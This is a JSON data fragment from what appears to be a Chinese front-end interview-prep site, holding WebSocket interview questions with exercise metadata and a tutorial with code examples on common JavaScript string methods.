    "testPoint": "### 1. **WebSocket 的基本概念**\n   - 什么是 WebSocket？它与传统的 HTTP 协议有什么区别？\n   - WebSocket 是如何实现持久化连接的？简述其握手过程。\n\n### 2. **WebSocket 的工作原理**\n   - WebSocket 连接是如何建立的？简述从 HTTP 请求到 WebSocket 连接建立的过程。\n   - WebSocket 如何实现全双工通信？这种通信模式有什么优势？\n\n### 3. **WebSocket 与 HTTP 长轮询**\n   - WebSocket 和 HTTP 长轮询的区别是什么？它们的适用场景有何不同？\n   - 如果在一个项目中考虑使用长轮询或 WebSocket，你会如何做选择？\n\n### 4. **WebSocket 的通信机制**\n   - 如何在 WebSocket 连接中发送和接收消息？请简要描述 WebSocket 的 `send` 和 `onmessage` 方法。\n   - WebSocket 如何处理二进制数据？是否支持文本和二进制格式的切换？\n\n### 5. **连接管理与状态监听**\n   - WebSocket 的连接状态有哪些？如何通过 `readyState` 判断当前连接状态？\n   - 在连接断开时，如何实现自动重连机制？自动重连的实现需要考虑哪些因素？\n\n### 6. **WebSocket 与安全性**\n   - WebSocket 如何保障安全性？你是否了解 **wss://** 和 **ws://** 的区别？\n   - 在 WebSocket 通信中如何防范安全问题，如数据窃取、恶意注入等？是否可以使用认证和授权来保护 WebSocket 连接？\n\n### 7. **使用场景**\n   - WebSocket 适合哪些应用场景？例如实时聊天、股票行情推送等。\n   - 在项目中，你是否使用过 WebSocket？请举例说明它在你项目中的应用场景和效果。\n\n### 8. **WebSocket 的服务器端实现**\n   - WebSocket 在服务器端的实现有哪些选择？是否了解一些常见的 WebSocket 库或框架，比如 Socket.IO、ws、Spring WebSocket？\n   - 在服务器端的 WebSocket 实现中，如何处理高并发和负载均衡的问题？\n\n### 9. **消息格式与协议设计**\n   - 在 WebSocket 应用中，如何设计消息格式？使用 JSON、Protobuf 等格式的优缺点是什么？\n   - 在实时应用中，如何通过协议设计来确保消息的完整性和序列化？\n\n### 10. **WebSocket 的心跳检测**\n   - 在 WebSocket 长连接中，为什么需要心跳检测？心跳检测的机制是什么？\n   - 请描述如何实现心跳检测并维护 WebSocket 连接的稳定性。\n\n### 11. **WebSocket 的性能优化**\n   - 在高频率实时通信的情况下，如何优化 WebSocket 的性能？如减少带宽消耗、优化数据结构等。\n   - WebSocket 如何与 CDN 配合使用？是否遇到过 WebSocket 在网络传输中的延迟问题？\n\n### 12. **WebSocket 的断线重连**\n   - 当 WebSocket 连接因网络问题断开时，如何实现自动重连？你会设计怎样的重连策略？\n   - 自动重连时需要考虑哪些因素？例如重连间隔时间、最大重试次数等。\n\n### 13. **WebSocket 的负载均衡与扩展**\n   - 在分布式应用中，如何实现 WebSocket 的负载均衡？是否可以使用反向代理来分发 WebSocket 请求？\n   - 如果需要支持横向扩展，WebSocket 连接如何在多个服务器间保持同步？\n\n### 14. **WebSocket 与其他实时通信技术的对比**\n   - WebSocket 与 Server-Sent Events (SSE) 有什么区别？在什么情况下选择 WebSocket，什么时候选择 SSE？\n   - WebSocket 与 MQTT、gRPC 等其他实时协议的优缺点是什么？\n\n### 15. **跨域与 CORS 设置**\n   - WebSocket 在跨域时需要做哪些设置？如何确保跨域 WebSocket 连接的安全性？\n   - 如果客户端和服务器在不同的域名下，如何处理 WebSocket 的跨域访问？\n\n### 16. **项目中的 WebSocket 应用经验**\n   - 在你的项目中，WebSocket 是如何部署的？是否遇到过挑战或性能瓶颈？\n   - 请描述一个实际项目中使用 WebSocket 的案例，如何处理实时数据、重连、负载均衡等问题？\n\n### 17. **WebSocket 的调试与监控**\n   - 在调试 WebSocket 应用时，你会使用哪些工具和方法来监控数据流？如何处理 WebSocket 连接中的错误？\n   - 在生产环境中，如何监控 WebSocket 的连接状态、消息量和延迟等性能指标？\n\n### 18. **WebSocket 的连接数量限制**\n   - 在大规模应用中，如何应对 WebSocket 连接数量的限制？请介绍一些可能的解决方案。\n   - 如何通过设计分布式架构支持大量 WebSocket 连接，比如在游戏、金融等实时场景中？",
    "exerciseKeyList": "[\"3dd31a51-615f-46b6-8fd4-244f579ac16c\",\"7053c84f-1316-43f2-a2ba-23fb00318220\",\"109fce53-20a7-420d-9231-681a35016a6d\",\"95185ca6-291f-4160-b65d-f291dfdf8a4f\",\"6100dbed-3600-470f-90b1-b1c6ef213a52\",\"68137df5-8569-4ae7-8c01-3b30419cf537\",\"14ad497b-56ee-461b-8c82-110f4d1c04b0\",\"4449a399-c20d-49e7-aac6-05236ee28662\",\"a951563c-7c0f-47bd-9a32-f46a8cfe4585\",\"013a77b6-e97b-4271-9e1b-9d632783979d\",\"9f860d42-8504-4562-8b9a-4a415ba5782a\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 27,
    "createAt": "2024-11-08T14:32:44.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "013a77b6-e97b-4271-9e1b-9d632783979d",
        "title": "介绍下WebSocket",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:59:38.000Z",
        "updateAt": "2024-07-19T18:02:12.000Z"
      },
      {
        "exerciseKey": "109fce53-20a7-420d-9231-681a35016a6d",
        "title": "websocket 中的 Handshaking 是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-24T01:25:01.000Z",
        "updateAt": "2025-08-28T08:14:32.000Z"
      },
      {
        "exerciseKey": "14ad497b-56ee-461b-8c82-110f4d1c04b0",
        "title": "WebSocket 中的心跳是为了解决什么问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:57:37.000Z",
        "updateAt": "2021-07-11T16:10:36.000Z"
      },
      {
        "exerciseKey": "3dd31a51-615f-46b6-8fd4-244f579ac16c",
        "title": "ChatGPT 的对话功能实现，为什么选择 SSE 协议而非 Websocket ？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-23T07:00:35.000Z",
        "updateAt": "2024-10-23T07:00:38.000Z"
      },
      {
        "exerciseKey": "4449a399-c20d-49e7-aac6-05236ee28662",
        "title": "说说对 WebSocket 的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:42:10.000Z",
        "updateAt": "2024-08-10T17:05:25.000Z"
      },
      {
        "exerciseKey": "6100dbed-3600-470f-90b1-b1c6ef213a52",
        "title": "webSocket 有哪些安全问题，应该如何应对？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:41:22.000Z",
        "updateAt": "2024-08-10T17:07:02.000Z"
      },
      {
        "exerciseKey": "68137df5-8569-4ae7-8c01-3b30419cf537",
        "title": "说说WebSocket和HTTP的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-06T14:08:39.000Z",
        "updateAt": "2024-08-10T17:06:35.000Z"
      },
      {
        "exerciseKey": "7053c84f-1316-43f2-a2ba-23fb00318220",
        "title": "需要在本地实现一个聊天室，多个tab页相互通信，不能用websocket，你会怎么做？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:01:13.000Z",
        "updateAt": "2024-08-10T17:07:31.000Z"
      },
      {
        "exerciseKey": "95185ca6-291f-4160-b65d-f291dfdf8a4f",
        "title": "说下 websocket 的连接原理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-24T01:24:25.000Z",
        "updateAt": "2024-08-10T17:07:21.000Z"
      },
      {
        "exerciseKey": "9f860d42-8504-4562-8b9a-4a415ba5782a",
        "title": "webSocket如何兼容低浏览器\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:41:27.000Z",
        "updateAt": "2021-07-04T16:07:25.000Z"
      },
      {
        "exerciseKey": "a951563c-7c0f-47bd-9a32-f46a8cfe4585",
        "title": "即时通讯的实现：短轮询、长轮询、SSE 和 WebSocket 间的区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T16:00:33.000Z",
        "updateAt": "2024-07-19T18:01:32.000Z"
      }
    ]
  },
  "158": {
    "id": 158,
    "tagId": 10,
    "title": "字符串常见方法",
    "explanation": "![JS字符串方法.png](https://static.ecool.fun//article/17f453c0-2f2e-44d0-9677-acc296aa4227.awebp)\n\n### 1\\. 获取字符串长度\n\nJavaScript中的字符串有一个length属性，该属性可以用来获取字符串的长度：\n\n```javascript\nconst str = 'hello';\nstr.length   // 输出结果：5\n```\n\n### 2\\. 获取字符串指定位置的值\n\ncharAt()和charCodeAt()方法都可以通过索引来获取指定位置的值：\n\n-   charAt() 方法获取到的是指定位置的字符；\n-   charCodeAt()方法获取的是指定位置字符的Unicode值。\n\n#### （1）charAt()\n\ncharAt() 方法可以返回指定位置的字符。其语法如下：\n\n```javascript\nstring.charAt(index)\n```\n\nindex表示字符在字符串中的索引值：\n\n```javascript\nconst str = 'hello';\nstr.charAt(1)  // 输出结果：e \n```\n\n我们知道，字符串也可以通过索引值来直接获取对应字符，那它和charAt()有什么区别呢？来看例子：\n\n```javascript\nconst str = 'hello';\nstr.charAt(1)  // 输出结果：e \nstr[1]         // 输出结果：e \nstr.charAt(5)  // 输出结果：'' \nstr[5]         // 输出结果：undefined\n```\n\n可以看到，当index的取值不在str的长度范围内时，str\\[index\\]会返回undefined，而charAt(index)会返回空字符串；除此之外，str\\[index\\]不兼容ie6-ie8，charAt(index)可以兼容。\n\n#### （2）charCodeAt()\n\n`charCodeAt()`：该方法会返回指定索引位置字符的 Unicode 值，返回值是 0 - 65535 之间的整数，表示给定索引处的 UTF-16 代码单元，如果指定位置没有字符，将返回 **NaN**：\n\n```javascript\nlet str = \"abcdefg\";\nconsole.log(str.charCodeAt(1)); // \"b\" --> 98\n```\n\n通过这个方法，可以获取字符串中指定Unicode编码值范围的字符。比如，数字0～9的Unicode编码范围是: 48～57，可以通过这个方法来筛选字符串中的数字，当然如果你更熟悉正则表达式，会更方便。\n\n### 3\\. 检索字符串是否包含特定序列\n\n这5个方法都可以用来检索一个字符串中是否包含特定的序列。其中前两个方法得到的指定元素的索引值，并且只会返回第一次匹配到的值的位置。后三个方法返回的是布尔值，表示是否匹配到指定的值。\n\n注意：这5个方法都对大小写敏感！\n\n#### （1）indexOf()\n\n`indexOf()`：查找某个字符，**有则返回第一次匹配到的位置**，否则返回-1，其语法如下：\n\n```javascript\nstring.indexOf(searchvalue,fromindex)\n```\n\n该方法有两个参数：\n\n-   searchvalue：必需，规定需检索的字符串值；\n-   fromindex：可选的整数参数，规定在字符串中开始检索的位置。它的合法取值是 0 到 string.length - 1。如省略该，则从字符串的首字符开始检索。\n\n```javascript\nlet str = \"abcdefgabc\";\nconsole.log(str.indexOf(\"a\"));   // 输出结果：0\nconsole.log(str.indexOf(\"z\"));   // 输出结果：-1\nconsole.log(str.indexOf(\"c\", 4)) // 输出结果：9\n```\n\n#### （2）lastIndexOf()\n\n`lastIndexOf()`：查找某个字符，有则返回最后一次匹配到的位置，否则返回-1\n\n```javascript\nlet str = \"abcabc\";\nconsole.log(str.lastIndexOf(\"a\"));  // 输出结果：3\nconsole.log(str.lastIndexOf(\"z\"));  // 输出结果：-1\n```\n\n该方法和indexOf()类似，只是查找的顺序不一样，indexOf()是正序查找，lastIndexOf()是逆序查找。\n\n#### （3）includes()\n\n`includes()`：该方法用于判断字符串是否包含指定的子字符串。如果找到匹配的字符串则返回 true，否则返回 false。该方法的语法如下：\n\n```javascript\nstring.includes(searchvalue, start)\n```\n\n该方法有两个参数：\n\n-   searchvalue：必需，要查找的字符串；\n-   start：可选，设置从那个位置开始查找，默认为 0。\n\n```javascript\nlet str = 'Hello world!';\n\nstr.includes('o')  // 输出结果：true\nstr.includes('z')  // 输出结果：false\nstr.includes('e', 2)  // 输出结果：false\n```\n\n#### （4）startsWith()\n\n`startsWith()`：该方法用于检测字符串**是否以指定的子字符串开始**。如果是以指定的子字符串开头返回 true，否则 false。其语法和上面的includes()方法一样。\n\n```javascript\nlet str = 'Hello world!';\n\nstr.startsWith('Hello') // 输出结果：true\nstr.startsWith('Helle') // 输出结果：false\nstr.startsWith('wo', 6) // 输出结果：true\n```\n\n#### （5）endsWith()\n\n`endsWith()`：该方法用来判断当前字符串**是否是以指定的子字符串结尾**。如果传入的子字符串在搜索字符串的末尾则返回 true，否则将返回 false。其语法如下：\n\n```javascript\nstring.endsWith(searchvalue, length)\n```\n\n该方法有两个参数：\n\n-   searchvalue：必需，要搜索的子字符串；\n-   length： 设置字符串的长度，默认值为原始字符串长度 string.length。\n\n```javascript\nlet str = 'Hello world!';\n\nstr.endsWith('!')       // 输出结果：true\nstr.endsWith('llo')     // 输出结果：false\nstr.endsWith('llo', 5)  // 输出结果：true\n```\n\n可以看到，当第二个参数设置为5时，就会从字符串的前5个字符中进行检索，所以会返回true。\n\n### 4\\. 连接多个字符串\n\nconcat() 方法用于连接两个或多个字符串。该方法不会改变原有字符串，会返回连接两个或多个字符串的新字符串。其语法如下：\n\n```javascript\nstring.concat(string1, string2, ..., stringX)\n```\n\n其中参数 string1, string2, ..., stringX 是必须的，他们将被连接为一个字符串的一个或多个字符串对象。\n\n```javascript\nlet str = \"abc\";\nconsole.log(str.concat(\"efg\"));          //输出结果：\"abcefg\"\nconsole.log(str.concat(\"efg\",\"hijk\")); //输出结果：\"abcefghijk\"\n```\n\n虽然concat()方法是专门用来拼接字符串的，但是在开发中使用最多的还是加操作符+，因为其更加简单。\n\n### 5\\. 字符串分割成数组\n\nsplit() 方法用于把一个字符串分割成字符串数组。该方法不会改变原始字符串。其语法如下：\n\n```javascript\nstring.split(separator,limit)\n```\n\n该方法有两个参数：\n\n-   separator：必需。字符串或正则表达式，从该参数指定的地方分割 string。\n-   limit：可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。\n\n```javascript\nlet str = \"abcdef\";\nstr.split(\"c\");    // 输出结果：[\"ab\", \"def\"]\nstr.split(\"\", 4)   // 输出结果：['a', 'b', 'c', 'd'] \n```\n\n如果把空字符串用作 separator，那么字符串中的每个字符之间都会被分割。\n\n```javascript\nstr.split(\"\");     // 输出结果：[\"a\", \"b\", \"c\", \"d\", \"e\", \"f\"]\n```\n\n其实在将字符串分割成数组时，可以同时拆分多个分割符，使用正则表达式即可实现：\n\n```javascript\nconst list = \"apples,bananas;cherries\"\nconst fruits = list.split(/[,;]/)\nconsole.log(fruits);  // 输出结果：[\"apples\", \"bananas\", \"cherries\"]\n```\n\n### 6\\. 截取字符串\n\nsubstr()、substring()和 slice() 方法都可以用来截取字符串。\n\n#### （1） slice()\n\nslice() 方法用于提取字符串的某个部分，并以新的字符串返回被提取的部分。其语法如下：\n\n```javascript\nstring.slice(start,end)\n```\n\n该方法有两个参数：\n\n-   start：必须。 要截取的片断的起始下标，第一个字符位置为 0。如果为负数，则从尾部开始截取。\n-   end：可选。 要截取的片段结尾的下标。若未指定此参数，则要提取的子串包括 start 到原字符串结尾的字符串。如果该参数是负数，那么它规定的是从字符串的尾部开始算起的位置。\n\n上面说了，如果start是负数，则该参数规定的是从字符串的尾部开始算起的位置。也就是说，-1 指字符串的最后一个字符，-2 指倒数第二个字符，以此类推：\n\n```javascript\nlet str = \"abcdefg\";\nstr.slice(1,6);   // 输出结果：\"bcdef\" \nstr.slice(1);     // 输出结果：\"bcdefg\" \nstr.slice();      // 输出结果：\"abcdefg\" \nstr.slice(-2);    // 输出结果：\"fg\"\nstr.slice(6, 1);  // 输出结果：\"\"\n```\n\n注意，该方法返回的子串**包括开始处的字符**，但**不包括结束处的字符**。\n\n#### （2） substr()\n\nsubstr() 方法用于在字符串中抽取从开始下标开始的指定数目的字符。其语法如下：\n\n```javascript\nstring.substr(start,length)\n```\n\n该方法有两个参数：\n\n-   start 必需。要抽取的子串的起始下标。必须是数值。如果是负数，那么该参数声明从字符串的尾部开始算起的位置。也就是说，-1 指字符串中最后一个字符，-2 指倒数第二个字符，以此类推。\n-   length：可选。子串中的字符数。必须是数值。如果省略了该参数，那么返回从 stringObject 的开始位置到结尾的字串。\n\n```javascript\nlet str = \"abcdefg\";\nstr.substr(1,6); // 输出结果：\"bcdefg\" \nstr.substr(1);   // 输出结果：\"bcdefg\" 相当于截取[1,str.length-1]\nstr.substr();    // 输出结果：\"abcdefg\" 相当于截取[0,str.length-1]\nstr.substr(-1);  // 输出结果：\"g\"\n```\n\n#### （3） substring()\n\nsubstring() 方法用于提取字符串中介于两个指定下标之间的字符。其语法如下：\n\n```javascript\nstring.substring(from, to)\n```\n\n该方法有两个参数：\n\n-   from：必需。一个非负的整数，规定要提取的子串的第一个字符在 string 中的位置。\n-   to：可选。一个非负的整数，比要提取的子串的最后一个字符在 string 中的位置多 1。如果省略该参数，那么返回的子串会一直到字符串的结尾。\n\n**注意：** 如果参数 from 和 to 相等，那么该方法返回的就是一个空串（即长度为 0 的字符串）。如果 from 比 to 大，那么该方法在提取子串之前会先交换这两个参数。并且该方法不接受负的参数，如果参数是个负数，就会返回这个字符串。\n\n```javascript\nlet str = \"abcdefg\";\nstr.substring(1,6); // 输出结果：\"bcdef\" [1,6)\nstr.substring(1);   // 输出结果：\"bcdefg\" [1,str.length-1]\nstr.substring();    // 输出结果：\"abcdefg\" [0,str.length-1]\nstr.substring(6,1); // 输出结果 \"bcdef\" [1,6)\nstr.substring(-1);  // 输出结果：\"abcdefg\"\n```\n\n注意，该方法返回的子串**包括开始处的字符**，但**不包括结束处的字符**。\n\n### 7\\. 字符串大小写转换\n\ntoLowerCase() 和 toUpperCase()方法可以用于字符串的大小写转换。\n\n#### （1）toLowerCase()\n\n`toLowerCase()`：该方法用于把字符串转换为小写。\n\n```javascript\nlet str = \"adABDndj\";\nstr.toLowerCase(); // 输出结果：\"adabdndj\"\n```\n\n#### （2）toUpperCase()\n\n`toUpperCase()`：该方法用于把字符串转换为大写。\n\n```javascript\nlet str = \"adABDndj\";\nstr.toUpperCase(); // 输出结果：\"ADABDNDJ\"\n```\n\n我们可以用这个方法来将字符串中第一个字母变成大写：\n\n```javascript\nlet word = 'apple'\nword = word[0].toUpperCase() + word.substr(1)\nconsole.log(word) // 输出结果：\"Apple\"\n```\n\n### 8\\. 字符串模式匹配\n\nreplace()、match()和search()方法可以用来匹配或者替换字符。\n\n#### （1）replace()\n\n`replace()`：该方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。其语法如下：\n\n```javascript\nstring.replace(searchvalue, newvalue)\n```\n\n该方法有两个参数：\n\n-   searchvalue：必需。规定子字符串或要替换的模式的 RegExp 对象。如果该值是一个字符串，则将它作为要检索的直接量文本模式，而不是首先被转换为 RegExp 对象。\n-   newvalue：必需。一个字符串值。规定了替换文本或生成替换文本的函数。\n\n```javascript\nlet str = \"abcdef\";\nstr.replace(\"c\", \"z\") // 输出结果：abzdef\n```\n\n执行一个全局替换, 忽略大小写:\n\n```javascript\nlet str=\"Mr Blue has a blue house and a blue car\";\nstr.replace(/blue/gi, \"red\");    // 输出结果：'Mr red has a red house and a red car'\n```\n\n**注意：** 如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。\n\n#### （2）match()\n\n`match()`：该方法用于在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。该方法类似 indexOf() 和 lastIndexOf()，但是它返回指定的值，而不是字符串的位置。其语法如下：\n\n```javascript\nstring.match(regexp)\n```\n\n该方法的参数 regexp 是必需的，规定要匹配的模式的 RegExp 对象。如果该参数不是 RegExp 对象，则需要首先把它传递给 RegExp 构造函数，将其转换为 RegExp 对象。\n\n**注意：** 该方法返回存放匹配结果的数组。该数组的内容依赖于 regexp 是否具有全局标志 g。\n\n```javascript\nlet str = \"abcdef\";\nconsole.log(str.match(\"c\")) // [\"c\", index: 2, input: \"abcdef\", groups: undefined]\n```\n\n#### （3）search()\n\n`search()`方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串。其语法如下：\n\n```javascript\nstring.search(searchvalue)\n```\n\n该方法的参数 regex 可以是需要在 string 中检索的子串，也可以是需要检索的 RegExp 对象。\n\n**注意：** 要执行忽略大小写的检索，请追加标志 i。该方法不执行全局匹配，它将忽略标志 g，也就是只会返回第一次匹配成功的结果。如果没有找到任何匹配的子串，则返回 -1。\n\n**返回值：** 返回 str 中第一个与 regexp 相匹配的子串的起始位置。\n\n```javascript\nlet str = \"abcdef\";\nstr.search(/bcd/)   // 输出结果：1\n```\n\n### 9\\. 移除字符串收尾空白符\n\ntrim()、trimStart()和trimEnd()这三个方法可以用于移除字符串首尾的头尾空白符，空白符包括：空格、制表符 tab、换行符等其他空白符等。\n\n#### （1）trim()\n\ntrim() 方法用于移除字符串首尾空白符，该方法不会改变原始字符串：\n\n```javascript\nlet str = \"  abcdef  \"\nstr.trim()    // 输出结果：\"abcdef\"\n```\n\n注意，该方法不适用于null、undefined、Number类型。\n\n#### （2）trimStart()\n\ntrimStart() 方法的的行为与`trim()`一致，不过会返回一个**从原始字符串的开头删除了空白的新字符串**，不会修改原始字符串：\n\n```javascript\nconst s = '  abc  ';\n\ns.trimStart()   // \"abc  \"\n```\n\n#### （3）trimEnd()\n\ntrimEnd() 方法的的行为与`trim()`一致，不过会返回一个**从原始字符串的结尾删除了空白的新字符串**，不会修改原始字符串：\n\n```javascript\nconst s = '  abc  ';\n\ns.trimEnd()   // \"  abc\"\n```\n\n### 10\\. 获取字符串本身\n\nvalueOf()和toString()方法都会返回字符串本身的值，感觉用处不大。\n\n#### （1）valueOf()\n\n`valueOf()`：返回某个字符串对象的原始值，该方法通常由 JavaScript 自动进行调用，而不是显式地处于代码中。\n\n```javascript\nlet str = \"abcdef\"\nconsole.log(str.valueOf()) // \"abcdef\"\n```\n\n#### （2）toString()\n\n`toString()`：返回字符串对象本身\n\n```javascript\nlet str = \"abcdef\"\nconsole.log(str.toString()) // \"abcdef\"\n```\n\n### 11\\. 重复一个字符串\n\nrepeat() 方法返回一个新字符串，表示将原字符串重复n次：\n\n```javascript\n'x'.repeat(3)     // 输出结果：\"xxx\"\n'hello'.repeat(2) // 输出结果：\"hellohello\"\n'na'.repeat(0)    // 输出结果：\"\"\n```\n\n如果参数是小数，会向下取整：\n\n```javascript\n'na'.repeat(2.9) // 输出结果：\"nana\"\n```\n\n如果参数是负数或者Infinity，会报错：\n\n```javascript\n'na'.repeat(Infinity)   // RangeError\n'na'.repeat(-1)         // RangeError\n```\n\n如果参数是 0 到-1 之间的小数，则等同于 0，这是因为会先进行取整运算。0 到-1 之间的小数，取整以后等于-0，repeat视同为 0。\n\n```javascript\n'na'.repeat(-0.9)   // 输出结果：\"\"\n```\n\n如果参数是NaN，就等同于 0：\n\n```javascript\n'na'.repeat(NaN)    // 输出结果：\"\"\n```\n\n如果repeat的参数是字符串，则会先转换成数字。\n\n```javascript\n'na'.repeat('na')   // 输出结果：\"\"\n'na'.repeat('3')    // 输出结果：\"nanana\"\n```\n\n### 12\\. 补齐字符串长度\n\npadStart()和padEnd()方法用于补齐字符串的长度。如果某个字符串不够指定长度，会在头部或尾部补全。\n\n#### （1）padStart()\n\n`padStart()`用于头部补全。该方法有两个参数，其中第一个参数是一个数字，表示字符串补齐之后的长度；第二个参数是用来补全的字符串。 ​\n\n如果原字符串的长度，等于或大于指定的最小长度，则返回原字符串：\n\n```javascript\n'x'.padStart(1, 'ab') // 'x'\n```\n\n如果用来补全的字符串与原字符串，两者的长度之和超过了指定的最小长度，则会截去超出位数的补全字符串：\n\n```javascript\n'x'.padStart(5, 'ab') // 'ababx'\n'x'.padStart(4, 'ab') // 'abax'\n```\n\n如果省略第二个参数，默认使用空格补全长度：\n\n```javascript\n'x'.padStart(4) // '   x'\n```\n\npadStart()的常见用途是为数值补全指定位数，笔者最近做的一个需求就是将返回的页数补齐为三位，比如第1页就显示为001，就可以使用该方法来操作：\n\n```javascript\n\"1\".padStart(3, '0')   // 输出结果： '001'\n\"15\".padStart(3, '0')  // 输出结果： '015'\n```\n\n#### （2）padEnd()\n\n`padEnd()`用于尾部补全。该方法也是接收两个参数，第一个参数是字符串补全生效的最大长度，第二个参数是用来补全的字符串：\n\n```javascript\n'x'.padEnd(5, 'ab') // 'xabab'\n'x'.padEnd(4, 'ab') // 'xaba'\n```\n\n### 13\\. 字符串转为数字\n\nparseInt()和parseFloat()方法都用于将字符串转为数字。\n\n#### （1）parseInt()\n\nparseInt() 方法用于可解析一个字符串，并返回一个整数。其语法如下：\n\n```javascript\nparseInt(string, radix)\n```\n\n该方法有两个参数：\n\n-   string：必需。要被解析的字符串。\n-   radix：可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。\n\n​\n\n当参数 radix 的值为 0，或没有设置该参数时，parseInt() 会根据 string 来判断数字的基数。\n\n```javascript\nparseInt(\"10\");\t\t\t  // 输出结果：10\nparseInt(\"17\",8);\t\t  // 输出结果：15 (8+7)\nparseInt(\"010\");\t\t  // 输出结果：10 或 8\n```\n\n当参数 radix 的值以 “0x” 或 “0X” 开头，将以 16 为基数：\n\n```javascript\nparseInt(\"0x10\")      // 输出结果：16\n```\n\n如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN：\n\n```javascript\nparseInt(\"50\", 1)      // 输出结果：NaN\nparseInt(\"50\", 40)     // 输出结果：NaN\n```\n\n只有字符串中的第一个数字会被返回，当遇到第一个不是数字的字符为止:\n\n```javascript\nparseInt(\"40 4years\")   // 输出结果：40\n```\n\n如果字符串的第一个字符不能被转换为数字，就会返回 NaN：\n\n```javascript\nparseInt(\"new100\")     // 输出结果：NaN\n```\n\n字符串开头和结尾的空格是允许的：\n\n```javascript\nparseInt(\"  60  \")    // 输出结果： 60\n```\n\n#### （2）parseFloat()\n\nparseFloat() 方法可解析一个字符串，并返回一个浮点数。该方法指定字符串中的首个字符是否是数字。如果是，则对字符串进行解析，直到到达数字的末端为止，然后以数字返回该数字，而不是作为字符串。其语法如下：\n\n```javascript\nparseFloat(string)\n```\n\nparseFloat 将它的字符串参数解析成为浮点数并返回。如果在解析过程中遇到了正负号（+ 或 -）、数字 (0-9)、小数点，或者科学记数法中的指数（e 或 E）以外的字符，则它会忽略该字符以及之后的所有字符，返回当前已经解析到的浮点数。同时参数字符串首位的空白符会被忽略。\n\n```javascript\nparseFloat(\"10.00\")      // 输出结果：10.00\nparseFloat(\"10.01\")      // 输出结果：10.01\nparseFloat(\"-10.01\")     // 输出结果：-10.01\nparseFloat(\"40.5 years\") // 输出结果：40.5\n\n```\n\n如果参数字符串的第一个字符不能被解析成为数字，则 parseFloat 返回 NaN。\n\n```javascript\nparseFloat(\"new40.5\")    // 输出结果：NaN\n```\n",
    "testPoint": "### 1. **基本字符串方法**\n   - `charAt` 和 `charCodeAt` 的区别是什么？如何使用它们获取字符串中某个字符或字符的 Unicode 编码？\n   - 如何通过 `concat` 拼接字符串？与 `+` 和模板字符串拼接相比有什么优缺点？\n\n### 2. **查找与判断**\n   - `indexOf`、`lastIndexOf` 和 `includes` 的区别是什么？这些方法在字符串查找中如何选择？\n   - 如何使用 `startsWith` 和 `endsWith` 判断字符串的开头或结尾内容？\n\n### 3. **提取子字符串**\n   - `slice`、`substring` 和 `substr` 的区别是什么？在什么情况下使用哪种方法？\n   - 你会如何使用 `slice` 实现字符串的反转？\n\n### 4. **大小写转换**\n   - 如何使用 `toUpperCase` 和 `toLowerCase` 实现字符串大小写转换？\n   - 如何实现一个首字母大写的函数？比如将 `\"hello world\"` 转换为 `\"Hello World\"`？\n\n### 5. **字符串替换**\n   - `replace` 和 `replaceAll` 的区别是什么？在什么场景下需要使用 `replaceAll`？\n   - `replace` 中的正则表达式如何实现全局替换？如何在替换中捕获匹配的内容并进行替换？\n\n### 6. **去除空白字符**\n   - `trim`、`trimStart` 和 `trimEnd` 的区别是什么？如何用它们去除字符串开头或结尾的空格？\n   - 如何去除字符串中所有的空白字符？是否可以使用正则表达式实现？\n\n### 7. **分割与连接**\n   - `split` 的用法是什么？如何使用它将字符串按特定分隔符转换为数组？\n   - 如何使用 `split` 和 `join` 方法实现字符串的重组，比如反转单词顺序等？\n\n### 8. **重复与填充**\n   - `repeat` 方法的作用是什么？如何使用它生成一个重复的字符串？\n   - `padStart` 和 `padEnd` 如何实现字符串的填充？请举例说明如何用它们补齐字符串的长度。\n\n### 9. **模板字符串**\n   - 什么是模板字符串？如何通过模板字符串来插入变量和表达式？\n   - 模板字符串中的 `${}` 语法还能做什么操作？比如进行数学运算或调用函数。\n\n### 10. **高级字符串操作**\n   - 如何使用正则表达式 `match`、`matchAll`、`search` 和 `split` 方法处理复杂文本？\n   - 如何通过 `replace` 和回调函数来动态替换内容？比如替换字符串中的占位符。\n\n### 11. **Unicode 与编码**\n   - 如何判断一个字符串是否包含某个 Unicode 字符？如何使用 `codePointAt` 和 `fromCodePoint` 处理 Unicode 编码？\n   - `normalize` 的作用是什么？在多语言字符处理中，它如何处理不同编码方式的字符？\n\n### 12. **字符串比较**\n   - JavaScript 中字符串是如何比较的？`localeCompare` 的作用是什么？\n   - 如何根据特定的语言或地区对字符串进行排序？`localeCompare` 如何实现多语言排序？\n\n### 13. **常见的字符串操作练习题**\n   - 如何实现字符串的反转？\n   - 如何判断一个字符串是否为回文？\n   - 给定一个句子，如何将每个单词的首字母大写？\n   - 如何提取字符串中的数字并进行求和？\n\n### 14. **处理特殊字符**\n   - 如何处理字符串中的特殊字符，比如换行符、制表符等？如何用正则表达式匹配这些字符？\n   - 在 HTML 中如何转义特殊字符？如 `&` 转为 `&amp;` 等？\n\n### 15. **性能与优化**\n   - 如果有大量字符串拼接任务，使用 `+` 和 `Array.join` 拼接的性能有何不同？\n   - 在字符串较长或操作频繁的情况下，是否有其他高效的字符串操作方法或工具可以推荐？",
